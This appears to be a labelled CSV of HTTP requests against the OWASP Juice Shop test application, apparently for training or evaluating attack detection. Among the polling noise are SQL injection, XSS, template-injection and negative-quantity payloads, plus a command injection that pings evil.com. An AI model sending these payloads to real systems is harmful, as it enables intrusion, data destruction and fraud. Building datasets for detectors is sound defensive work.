source_app,label,method,path,body,status_code,response_size
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWKxrq&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWKxru&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWL1zr&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWL1zt&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWL84N&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWL84R&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWLEEm&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWLEEr&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWLKN1&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWLKNZ&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWLQUZ&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWLQUf&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWLWcK&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWLWcM&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWLcl6&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWLclK&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWLis9&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWLisC&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWLpEq&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWLpEs&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWLvLt&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWLvLw&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWL_SE&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWL_SF&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWM5Zq&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWM5a8&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWMBgu&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWMBgw&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWMHtc&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWMHtq&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWMO4x&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWMO5Z&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWMUC5&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWMUCU&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWMaJG&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWMaJK&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWMgQD&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWMgS7&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWMmWo&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWMmWq&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWMsdc&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWMsdd&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWMykQ&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWMykV&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWN2sP&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWN2sQ&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWN8zO&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWN8zV&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWNF4S&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWNF4V&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWNLBA&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWNLBE&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWNRH_&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWNRI3&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWNXP4&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWNXP6&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWNdVx&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWNdWN&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWNjd8&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWNjdC&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWNpkS&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWNpkb&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWNvs3&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWNvs9&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWN_-1&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWN_-7&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWO65E&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWO65G&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWOCC6&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWOCC9&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWOIIs&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWOII_&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWOOPc&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWOOPk&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWOUWI&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWOUWM&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWOadS&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWOadc&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWOgkf&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWOgkh&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWOmrW&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWOmri&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWOsyZ&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,POST,/api/Users,"{\x22email\x22: \x22attacker91910@test.com\x22, \x22password\x22: \x22Test1234!\x22, \x22passwordRepeat\x22: \x22Test1234!\x22, \x22securityQuestion\x22: {\x22id\x22: 1, \x22question\x22: \x22Your eldest siblings middle name?\x22}, \x22securityAnswer\x22: \x22test\x22}",201,313
juiceshop,attack,POST,/rest/user/login,"{\x22email\x22: \x22attacker91910@test.com\x22, \x22password\x22: \x22Test1234!\x22}",200,820
juiceshop,attack,POST,/api/Addresss,"{\x22fullName\x22: \x22Test User 646\x22, \x22mobileNum\x22: \x225206103075\x22, \x22zipCode\x22: \x2215066\x22, \x22streetAddress\x22: \x22255 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,286
juiceshop,attack,POST,/api/Addresss,"{\x22fullName\x22: \x22Test User 599\x22, \x22mobileNum\x22: \x224508079769\x22, \x22zipCode\x22: \x2246771\x22, \x22streetAddress\x22: \x22253 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,286
juiceshop,attack,POST,/api/Addresss,"{\x22fullName\x22: \x22Test User 31\x22, \x22mobileNum\x22: \x227343377182\x22, \x22zipCode\x22: \x2236698\x22, \x22streetAddress\x22: \x22111 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,285
juiceshop,attack,POST,/api/Cards,"{\x22fullName\x22: \x22Test User 957\x22, \x22cardNum\x22: \x224218239359708059\x22, \x22expMonth\x22: 7, \x22expYear\x22: 2026}",400,140
juiceshop,attack,POST,/api/Cards,"{\x22fullName\x22: \x22Test User 652\x22, \x22cardNum\x22: \x224802290097638604\x22, \x22expMonth\x22: 7, \x22expYear\x22: 2028}",400,140
juiceshop,attack,POST,/api/Cards,"{\x22fullName\x22: \x22Test User 687\x22, \x22cardNum\x22: \x224170138513375174\x22, \x22expMonth\x22: 8, \x22expYear\x22: 2029}",400,140
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 25, \x22BasketId\x22: 9, \x22quantity\x22: 2}",200,156
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 3, \x22BasketId\x22: 9, \x22quantity\x22: 2}",200,155
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 1, \x22BasketId\x22: 9, \x22quantity\x22: 2}",200,155
juiceshop,attack,GET,/rest/products/search?q=%27%20UNION%20SELECT%201%2C2%2C3--,,500,369
juiceshop,attack,PUT,/api/Addresss/62,"{\x22fullName\x22: \x22Updated '\x5C\x22><script>aler\x22, \x22city\x22: \x22New '\x5C\x22><script City\x22}",200,309
juiceshop,attack,DELETE,/api/BasketItems/53,,200,30
juiceshop,attack,GET,/rest/basket/9,,200,972
juiceshop,attack,PUT,/api/Addresss/63,"{\x22streetAddress\x22: \x22789 ' OR 1=1-- Blvd\x22, \x22state\x22: \x22XX\x22}",200,289
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWOsz1&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,DELETE,/api/BasketItems/52,,200,30
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWOzJP&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/api/Challenges,,200,8724
juiceshop,attack,PUT,/api/Addresss/61,"{\x22fullName\x22: \x22Updated <script>alert('\x22, \x22city\x22: \x22New <script>al City\x22}",200,307
juiceshop,attack,POST,/api/Cards,"{\x22fullName\x22: \x22Test User 406\x22, \x22cardNum\x22: \x224325617450057111\x22, \x22expMonth\x22: 2, \x22expYear\x22: 2027}",400,140
juiceshop,attack,POST,/api/Cards,"{\x22fullName\x22: \x22Test User 874\x22, \x22cardNum\x22: \x224370221347857725\x22, \x22expMonth\x22: 9, \x22expYear\x22: 2030}",400,140
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 9, \x22BasketId\x22: 9, \x22quantity\x22: 3}",200,155
juiceshop,attack,DELETE,/api/BasketItems/54,,200,30
juiceshop,attack,GET,/rest/products/search?q=%24%7B7%2A7%7D,,200,30
juiceshop,attack,POST,/api/Cards,"{\x22fullName\x22: \x22Test User 821\x22, \x22cardNum\x22: \x224999714344501065\x22, \x22expMonth\x22: 10, \x22expYear\x22: 2030}",400,140
juiceshop,attack,PUT,/api/BasketItems/51,{\x22quantity\x22: -1},200,157
juiceshop,attack,POST,/api/Cards,"{\x22fullName\x22: \x22Test User 94\x22, \x22cardNum\x22: \x224229745294946390\x22, \x22expMonth\x22: 12, \x22expYear\x22: 2027}",400,140
juiceshop,attack,DELETE,/api/BasketItems/51,,200,30
juiceshop,attack,GET,/api/Addresss,,200,853
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 1, \x22BasketId\x22: 9, \x22quantity\x22: 2}",200,155
juiceshop,attack,PUT,/api/BasketItems/55,{\x22quantity\x22: 7},400,61
juiceshop,attack,DELETE,/api/Addresss/63,,200,59
juiceshop,attack,GET,/api/Cards,,200,30
juiceshop,attack,PUT,/api/Addresss/62,"{\x22streetAddress\x22: \x22789 ' OR '1'='1 Blvd\x22, \x22state\x22: \x22XX\x22}",200,314
juiceshop,attack,DELETE,/api/BasketItems/55,,200,30
juiceshop,attack,GET,/api/Cards,,200,30
juiceshop,attack,PUT,/api/Addresss/62,"{\x22streetAddress\x22: \x22789 ' UNION SELECT  Blvd\x22, \x22state\x22: \x22XX\x22}",200,318
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWOzJg&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWP3T2&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,DELETE,/api/Addresss/62,,200,59
juiceshop,attack,GET,/api/SecurityQuestions,,200,444
juiceshop,attack,PUT,/api/Addresss/61,"{\x22streetAddress\x22: \x22789 '; DROP TABLE u Blvd\x22, \x22state\x22: \x22XX\x22}",200,316
juiceshop,attack,POST,/api/Addresss,"{\x22fullName\x22: \x22Test User 802\x22, \x22mobileNum\x22: \x227772607020\x22, \x22zipCode\x22: \x2235428\x22, \x22streetAddress\x22: \x22834 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,286
juiceshop,attack,POST,/api/Cards,"{\x22fullName\x22: \x22Test User 928\x22, \x22cardNum\x22: \x224949771234505643\x22, \x22expMonth\x22: 2, \x22expYear\x22: 2030}",400,140
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 4, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,155
juiceshop,attack,DELETE,/api/BasketItems/56,,200,30
juiceshop,attack,GET,/rest/products/15/reviews,,200,30
juiceshop,attack,PUT,/api/Addresss/61,"{\x22streetAddress\x22: \x22789 ' OR 'x'='x Blvd\x22, \x22state\x22: \x22XX\x22}",200,312
juiceshop,attack,POST,/api/Cards,"{\x22fullName\x22: \x22Test User 588\x22, \x22cardNum\x22: \x224697025427926814\x22, \x22expMonth\x22: 10, \x22expYear\x22: 2030}",400,140
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 31, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,156
juiceshop,attack,DELETE,/api/BasketItems/57,,200,30
juiceshop,attack,GET,/rest/products/search?q=%3B%20ping%20-c%205%20evil.com,,200,30
juiceshop,attack,PUT,/api/Addresss/61,"{\x22streetAddress\x22: \x22789 ' OR '1'='1 Blvd\x22, \x22state\x22: \x22XX\x22}",200,312
juiceshop,attack,POST,/api/Cards,"{\x22fullName\x22: \x22Test User 877\x22, \x22cardNum\x22: \x224326261386153445\x22, \x22expMonth\x22: 4, \x22expYear\x22: 2030}",400,140
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 27, \x22BasketId\x22: 9, \x22quantity\x22: 2}",400,61
juiceshop,attack,POST,/api/Cards,"{\x22fullName\x22: \x22Test User 907\x22, \x22cardNum\x22: \x224270556306801683\x22, \x22expMonth\x22: 7, \x22expYear\x22: 2026}",400,140
juiceshop,attack,DELETE,/api/Addresss/64,,200,59
juiceshop,attack,GET,/rest/languages?q=%27%20AND%201%3D1--,,200,1582
juiceshop,attack,PUT,/api/Addresss/61,"{\x22fullName\x22: \x22Updated <script>alert(d\x22, \x22city\x22: \x22New <script>al City\x22}",200,312
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWP3TA&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWP9a6&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,DELETE,/api/Addresss/61,,200,59
juiceshop,attack,GET,/rest/track-order/,,500,336
juiceshop,attack,POST,/api/Addresss,"{\x22fullName\x22: \x22Test User 91\x22, \x22mobileNum\x22: \x225477940034\x22, \x22zipCode\x22: \x2230921\x22, \x22streetAddress\x22: \x22935 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,285
juiceshop,attack,PUT,/api/Addresss/65,"{\x22fullName\x22: \x22Updated <svg onload=ale\x22, \x22city\x22: \x22New <svg onloa City\x22}",200,307
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 8, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,155
juiceshop,attack,DELETE,/api/BasketItems/58,,200,30
juiceshop,attack,GET,/api/Challenges,,200,8724
juiceshop,attack,PUT,/rest/products/4/reviews,"{\x22message\x22: \x22Review: <script>alert('XSS')</script>\x22, \x22author\x22: \x22attacker91910@test.com\x22}",201,20
juiceshop,attack,DELETE,/api/Addresss/65,,200,59
juiceshop,attack,GET,/rest/basket/9,,200,154
juiceshop,attack,POST,/api/Addresss,"{\x22fullName\x22: \x22Test User 995\x22, \x22mobileNum\x22: \x229889505880\x22, \x22zipCode\x22: \x2259358\x22, \x22streetAddress\x22: \x22406 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,286
juiceshop,attack,PUT,/api/Addresss/66,"{\x22streetAddress\x22: \x22789 ' OR 1=1-- Blvd\x22, \x22state\x22: \x22XX\x22}",200,290
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 19, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,156
juiceshop,attack,DELETE,/api/BasketItems/59,,200,30
juiceshop,attack,GET,/api/Products/14?test=admin%27--,,200,428
juiceshop,attack,POST,/api/Cards,"{\x22fullName\x22: \x22Test User 776\x22, \x22cardNum\x22: \x224421434195362386\x22, \x22expMonth\x22: 2, \x22expYear\x22: 2026}",400,140
juiceshop,attack,PUT,/api/Addresss/66,"{\x22fullName\x22: \x22Updated '\x5C\x22><script>aler\x22, \x22city\x22: \x22New '\x5C\x22><script City\x22}",200,313
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 12, \x22BasketId\x22: 9, \x22quantity\x22: 3}",200,156
juiceshop,attack,DELETE,/api/BasketItems/60,,200,30
juiceshop,attack,GET,/rest/user/whoami,,200,11
juiceshop,attack,PUT,/api/Addresss/66,"{\x22streetAddress\x22: \x22789 ' OR '1'='1'-- Blvd\x22, \x22state\x22: \x22XX\x22}",200,317
juiceshop,attack,POST,/api/Cards,"{\x22fullName\x22: \x22Test User 294\x22, \x22cardNum\x22: \x224408475547795829\x22, \x22expMonth\x22: 2, \x22expYear\x22: 2030}",400,140
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 3, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,155
juiceshop,attack,DELETE,/api/BasketItems/61,,200,30
juiceshop,attack,GET,/api/SecurityQuestions,,200,444
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWP9a9&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWPFhP&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 2, \x22BasketId\x22: 9, \x22quantity\x22: 3}",200,155
juiceshop,attack,PUT,/api/BasketItems/62,{\x22quantity\x22: -1},200,156
juiceshop,attack,DELETE,/api/BasketItems/62,,200,30
juiceshop,attack,GET,/api/Cards,,200,30
juiceshop,attack,PUT,/api/Addresss/66,"{\x22streetAddress\x22: \x22789 '; DROP TABLE u Blvd\x22, \x22state\x22: \x22XX\x22}",200,318
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 32, \x22BasketId\x22: 9, \x22quantity\x22: 3}",200,156
juiceshop,attack,DELETE,/api/BasketItems/63,,200,30
juiceshop,attack,GET,/api/Quantitys,,200,548
juiceshop,attack,POST,/api/Cards,"{\x22fullName\x22: \x22Test User 64\x22, \x22cardNum\x22: \x224500797027375711\x22, \x22expMonth\x22: 6, \x22expYear\x22: 2029}",400,140
juiceshop,attack,PUT,/api/Addresss/66,"{\x22streetAddress\x22: \x22789 admin'-- Blvd\x22, \x22state\x22: \x22XX\x22}",200,311
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 2, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,155
juiceshop,attack,DELETE,/api/BasketItems/64,,200,30
juiceshop,attack,GET,/rest/track-order/,,500,336
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 2, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,155
juiceshop,attack,PUT,/api/BasketItems/65,{\x22quantity\x22: -1},200,156
juiceshop,attack,DELETE,/api/BasketItems/65,,200,30
juiceshop,attack,GET,/api/Products/10?test=%27%20OR%201%3D1--,,404,35
juiceshop,attack,POST,/api/Cards,"{\x22fullName\x22: \x22Test User 310\x22, \x22cardNum\x22: \x224272184705488806\x22, \x22expMonth\x22: 11, \x22expYear\x22: 2030}",400,140
juiceshop,attack,POST,/api/Addresss,"{\x22fullName\x22: \x22Test User 3\x22, \x22mobileNum\x22: \x224312157045\x22, \x22zipCode\x22: \x2216134\x22, \x22streetAddress\x22: \x22763 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,284
juiceshop,attack,POST,/api/Cards,"{\x22fullName\x22: \x22Test User 874\x22, \x22cardNum\x22: \x224630245345219406\x22, \x22expMonth\x22: 7, \x22expYear\x22: 2028}",400,140
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 31, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,156
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWPFk6&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWPLoX&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWPLof&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWPRwW&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWPR--&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWPY5M&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWPY5P&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWPeC8&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWPeCB&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWPkJ3&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWPkLJ&sid=SbspUjGrg7PI3q_MAAAI,,200,1
